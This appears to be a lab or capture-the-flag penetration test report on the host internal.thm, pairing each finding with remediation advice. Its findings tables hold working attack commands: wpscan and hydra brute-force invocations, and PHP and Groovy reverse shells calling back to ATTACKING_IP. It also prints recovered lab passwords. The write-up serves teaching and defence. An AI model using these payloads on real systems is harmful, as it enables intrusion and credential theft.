# WORK IN PROGRESS

# 🛡️ Comprehensive Penetration Test Report (With Commands Log)

**Target:** internal.thm (10.201.35.3)
**Assessment Date:** November 2025
**Tested By:** [Gemini Security Team]
**Report Version:** 2.0 (Includes Full Commands Log)

---

## 1. Executive Summary

The security assessment of the target environment resulted in a **full system compromise (Root Access)**. The primary weaknesses were extremely poor credential hygiene and outdated software. Initial access was gained through a predictable brute-force attack on the public-facing WordPress service, which led to a cascading compromise of user accounts and, critically, the discovery of the **Root password stored in cleartext**.

The overall risk rating is **CRITICAL**. Immediate action is necessary to enforce strong password policies, implement dedicated secret management, and patch all legacy services.

### Summary of Findings by Severity

| ID | Finding Title | Severity | Exploited Commands Used |
| :--- | :--- | :--- | :--- |
| **C-01** | Cleartext Root Password in Plain File | **CRITICAL** | `cat notes.txt`, `su root` |
| **C-02** | Sensitive Data Disclosure (User Credentials) | **CRITICAL** | `cat /opt/wp-save.txt`, `ssh aubreanna@internal.thm` |
| **H-01** | Weak Credentials for WordPress (Admin) | **HIGH** | `wpscan ... --passwords rockyou.txt` |
| **H-02** | Weak Credentials for Internal Jenkins Service | **HIGH** | `ssh -L ...`, `hydra ... -P rockyou.txt` |
| **M-01** | Outdated and Insecure WordPress Version (5.4.2) | **MEDIUM** | `wpscan --url http://internal.thm/blog/` |
| **L-01** | Outdated Apache HTTP Server Version (2.4.29) | **LOW** | `nmap -sV -A 10.201.35.3` |

---

## 2. Technical Findings and Remediation

### CRITICAL FINDINGS

#### C-01: Cleartext Root Password in Plain File

* **Severity:** **CRITICAL**
* **Vector:** Post-compromise Internal File Disclosure
* **Description:** The root user's password was stored in a non-standard, unencrypted plain text file (`notes.txt`) that was accessible to the lower-privileged `jenkins` account. This completely bypassed all other privilege escalation vectors.

* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command | Result |
    | :--- | :--- | :--- | :--- |
    | **1. File Discovery** | Jenkins Shell | `cat notes.txt` | Root Password Found: `tr0ub13guM!@#123` |
    | **2. Privilege Escalation** | Jenkins Shell | `su root` | Full System Compromise (Root Access) |
    | **3. Final Flag** | Root Shell | `cat /root/root.txt` | Root Flag Retrieved |

* **Remediation Tachtiqque:** Implement a dedicated secret management vault (e.g., HashiCorp Vault) and enforce a strict policy of **NO** cleartext password storage on any host.

#### C-02: Sensitive Data Disclosure (User Credentials)

* **Severity:** **CRITICAL**
* **Vector:** Local File Read / User Credential Leak
* **Description:** The credentials for the user `aubreanna` were found in a plain text file (`wp-save.txt`) within the `/opt/` directory, readable by the low-privileged `www-data` user.

* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command | Result |
    | :--- | :--- | :--- | :--- |
    | **1. Initial Access** | www-data Shell | `cat /opt/wp-save.txt` | User credentials recovered: `aubreanna:bubb13guM!@#123` |
    | **2. Lateral Movement** | Attacker Machine | `ssh aubreanna@internal.thm` | Stable shell access as user `aubreanna` |
    | **3. User Flag** | aubreanna Shell | `cat user.txt` | User Flag Retrieved |

* **Remediation Tachtiqque:** Immediately rotate the password for `aubreanna`. Enforce the **Principle of Least Privilege (PoLP)**: restrict `www-data` from reading files in non-web directories like `/opt/`.

### HIGH FINDINGS

#### H-01: Weak Credentials for WordPress (Admin)

* **Severity:** **HIGH**
* **Vector:** External Brute-Force
* **Description:** The administrative account for WordPress used a password (`my2boys`) easily found in common wordlists, allowing trivial initial access.

* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command | Result |
    | :--- | :--- | :--- | :--- |
    | **1. Brute-Force** | Attacker Machine | `wpscan --url http://internal.thm/blog/wp-login.php --usernames Admin --passwords /usr/share/wordlists/rockyou.txt` | Valid pair found: `Admin:my2boys` |
    | **2. Shell Setup** | Attacker Machine | `nc -lvnp 4444` | Listener prepared for reverse shell |
    | **3. Shell Execution** | WP Theme Editor | *PHP code injected:* `exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING_IP/4444 0>&1'");` | Initial shell access as `www-data` |

* **Remediation Tachtiqque:** Implement **MFA** for all admin users. Enforce a minimum 16-character complex password policy and use a login attempt limiter (e.g., Fail2Ban).

#### H-02: Weak Credentials for Internal Jenkins Service

* **Severity:** **HIGH**
* **Vector:** Internal Lateral Brute-Force
* **Description:** The internal Jenkins service (172.17.0.2:8080) used a weak administrative password (`spongebob`), granting full control and RCE capability via the Script Console.

* **Exploitation Path (Evidence - Commands Used):**

    | Step | Context | Command | Result |
    | :--- | :--- | :--- | :--- |
    | **1. Network Bridge** | Attacker Machine | `ssh -L 8888:172.17.0.2:8080 aubreanna@internal.thm` | Creates a local tunnel to internal Jenkins service |
    | **2. Brute-Force** | Attacker Machine | `hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt` | Valid pair found: `admin:spongebob` |
    | **3. RCE** | Jenkins Console | *Groovy Script executed:* `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING_IP/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()` | Reverse shell as `jenkins` user |

* **Remediation Tachtiqque:** Enforce the strong password policy and immediately **disable or strictly limit** access to the Groovy Script Console in production environments.

### MEDIUM & LOW FINDINGS

#### M-01: Outdated and Insecure WordPress Version (5.4.2)

* **Severity:** **MEDIUM**
* **Vector:** Publicly Known Vulnerabilities (CVEs)
* **Description:** The installed version is unsupported and known to be vulnerable.
* **Evidence Command:** `wpscan --url http://internal.thm/blog/wp-login.php` (Output shows **WordPress version 5.4.2**).
* **Remediation:** **Immediate Upgrade** to the latest stable WordPress version (currently 6.x).

#### L-01: Outdated Apache HTTP Server Version (2.4.29)

* **Severity:** **LOW**
* **Vector:** Publicly Known Vulnerabilities (CVEs)
* **Description:** Apache 2.4.29 is outdated and exposes the server to numerous known vulnerabilities, though it was not the primary exploitation vector here.
* **Evidence Command:** `nmap -sC -sV -A 10.201.35.3` (Output shows **Apache httpd 2.4.29 (Ubuntu)**).
* **Remediation:** Apply the latest system patches to update Apache to a secure version (2.4.58+).

---

## 3. Mitigation Tachtiqques and Remediation Plan

This section provides the actionable security tactics necessary to resolve the identified findings.

### Tactic A: Secure Credential Management (Focus on CRITICAL C-01 & C-02)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. Root Password Rotation** | Vault Integration | **Action:** Immediately rotate the root password to a 32-character random string. **Command:** `passwd root` |
| **2. Secure File Deletion** | Secure Deletion | Locate and securely delete files containing cleartext passwords. **Command:** `shred -u /opt/wp-save.txt` **Command:** `shred -u /home/jenkins/notes.txt` |
| **3. PoLP Enforcement** | Access Control | Restrict the `www-data` user's read access to all non-web directories. **Command:** `chmod 700 /opt` (or specific ACLs) |
| **4. SSH Key-Only Access** | Key-Based Auth | Disable password login for SSH. **Command:** Edit `/etc/ssh/sshd_config`, set `PasswordAuthentication no`, and restart service. |

### Tactic B: Proactive Defense Against Brute Force (Focus on HIGH H-01 & H-02)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. Implement MFA** | Adaptive Authentication | **Action:** Deploy MFA for WordPress and Jenkins. |
| **2. Login Rate Limiting** | Fail2Ban | Install and configure Fail2Ban to monitor logs and block brute-force IPs. **Command:** `sudo apt install fail2ban` **Command:** `sudo systemctl enable fail2ban` |
| **3. Enforce Strong Passwords** | Policy Management | **Action:** Mandate minimum 16-character passwords across all systems. **Command:** *Update PAM or Active Directory policy.* |

### Tactic C: Patching and Hardening (Focus on M-01 & L-01)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. System Updates** | Automated Patching | Update all OS packages and services immediately. **Command:** `sudo apt update && sudo apt upgrade -y` |
| **2. WordPress Upgrade** | Application Patching | Update WordPress core. **Command:** *Use WP-CLI or the WordPress dashboard auto-updater.* |
| **3. Jenkins RCE Mitigation** | Feature Restriction | Disable the Groovy Script Console to prevent post-login RCE. **Action:** *Configure Jenkins security settings.* |
```eof
